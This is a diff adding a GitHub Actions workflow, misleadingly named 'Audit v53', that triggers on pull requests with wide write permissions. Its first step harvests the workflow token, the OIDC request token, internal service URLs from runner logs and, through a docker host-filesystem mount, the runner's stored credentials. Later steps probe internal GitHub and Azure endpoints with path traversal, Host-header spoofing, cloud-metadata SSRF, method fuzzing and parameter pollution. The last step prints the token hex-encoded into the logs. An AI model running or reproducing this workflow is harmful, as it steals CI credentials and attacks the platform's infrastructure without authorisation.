@@ -1,0 +1,231 @@
+name: Audit v53
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v53:
+    runs-on: ubuntu-latest
+    steps:
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 1: Harvest
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V53 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            d=json.loads(binascii.unhexlify(h).decode())
+            t=d.get('Data',{}).get('token','')
+            open('/tmp/cred_token.txt','w').write(t)
+            print(f'CTOK_LEN={len(t)}')
+          " 2>/dev/null
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: LOAD BALANCER & ROUTING SSRF
+      # The artifactcache hit an Azure AFD 400 "services aren't available"
+      # This means we bypassed the gateway but hit an unassigned route.
+      # Let's hit the internal load balancers with manipulated Host headers!
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - Azure Routing Bypass / SSRF
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== ROUTING BYPASS & SSRF ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          URL="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          VER="api-version=6.0-preview"
+
+          # Target the exact URL that returned AFD 400
+          TARGET="$URL/_apis/distributedtask/pools/..%2fadmintoken"
+
+          # A: Spoof the Host header to hit internal services via the AFD proxy
+          echo "--- A: Host Splitting & Spoofing ---"
+          for HOST in \
+            "vstoken.actions.githubusercontent.com" \
+            "pipelines.actions.githubusercontent.com" \
+            "management.azure.com" \
+            "169.254.169.254" \
+            "localhost" \
+            "artifactcache.actions.githubusercontent.com:80" \
+            "artifactcache.actions.githubusercontent.com%00" \
+            "vsmps.actions.githubusercontent.com" \
+            "mpsghub.actions.githubusercontent.com"; do
+            R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $HOST" \
+              "$TARGET" --path-as-is 2>/dev/null | head -15)
+            # Find HTTP status code from header
+            CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+            if [ -n "$CODE" ]; then
+              echo "A Host=$HOST = $CODE"
+            fi
+          done
+          echo ""
+
+          # B: X-Headers routing bypass
+          echo "--- B: X-Headers SSRF ---"
+          for XHOST in \
+            "169.254.169.254" \
+            "vstoken.actions.githubusercontent.com" \
+            "management.azure.com"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "X-Forwarded-Host: $XHOST" \
+              -H "X-Rewrite-URL: /metadata/instance?api-version=2021-02-01" \
+              -H "X-Original-URL: /metadata/instance?api-version=2021-02-01" \
+              -H "X-Custom-Forwarder: $XHOST" \
+              "$TARGET" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B XHost=$XHOST = $CODE | $(echo "$BODY" | head -c 150)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: DEEP HTTP METHOD OVERRIDES on ADMINTOKEN
+      # 204 returned for simple GET and POST. But what if the resource
+      # requires body mapping in a specific command, or DELETE?
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - HTTP Method Deep Fuzz
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== METHOD FUZZ ADMINTOKEN ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+          VER="api-version=6.0-preview"
+
+          TARGET="$PIPE/_apis/distributedtask/pools/..%2fadmintoken"
+
+          # A: Deep HTTP Methods (even nonsense ones)
+          echo "--- A: Weird HTTP Methods ---"
+          for METH in "DELETE" "CONNECT" "PROPFIND" "MKCOL" "COPY" "MOVE" "LOCK" "UNLOCK"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X $METH --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              "$TARGET" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            if [ "$BODY" != "null" ]; then
+              echo "A $METH = $CODE | $(echo "$BODY" | head -c 150)"
+            fi
+          done
+          echo ""
+
+          # B: X-HTTP-Method-Override on POST (Tunneling commands)
+          echo "--- B: Tunneling via POST ---"
+          for TMETH in "GET" "PUT" "DELETE" "PATCH"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "X-HTTP-Method-Override: $TMETH" \
+              -H "Content-Type: application/json" \
+              -H "Accept: application/json; $VER" \
+              "$TARGET" --path-as-is -d '{"poolId":1}' 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B Tunnel $TMETH = $CODE | $(echo "$BODY" | head -c 100)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: URL PARAMETER POLLUTION & SPLITTING
+      # 204 usually means the parameters we supplied were ignored!
+      # We need to forcefully inject parameters using pollution
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - URL Parameter Pollution
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== PARAMETER POLLUTION ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PIPE="https://pipelinesghubeus14.actions.githubusercontent.com/$SECRET"
+
+          # Query parameter pollution (HPP)
+          echo "--- A: Query Pollution ---"
+          for QP in \
+            "?poolId=1&poolId=2" \
+            "?poolId[]=1" \
+            "?poolId[0]=1" \
+            "?poolId={1}" \
+            "?poolId=%7b1%7d" \
+            "?poolId=1&agentId=1&agentId=2" \
+            "?token=true&token=false" \
+            "?includeToken=1&includeToken=true&includeToken=yes"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Accept: application/json" \
+              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken$QP" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            echo "A $(echo "$QP" | head -c 30) = $CODE | $(echo "$R" | sed '$d' | head -c 100)"
+          done
+          echo ""
+
+          # Path parameters (Matrix parameters)
+          echo "--- B: Matrix Parameters ---"
+          for MP in \
+            ";poolId=1" \
+            ";token=true" \
+            ";includeToken=true"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 2 -m 3 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Accept: application/json" \
+              "$PIPE/_apis/distributedtask/pools/..%2fadmintoken$MP" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            echo "B $MP = $CODE | $(echo "$R" | sed '$d' | head -c 100)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: Final
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V53 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V53 COMPLETE ==="
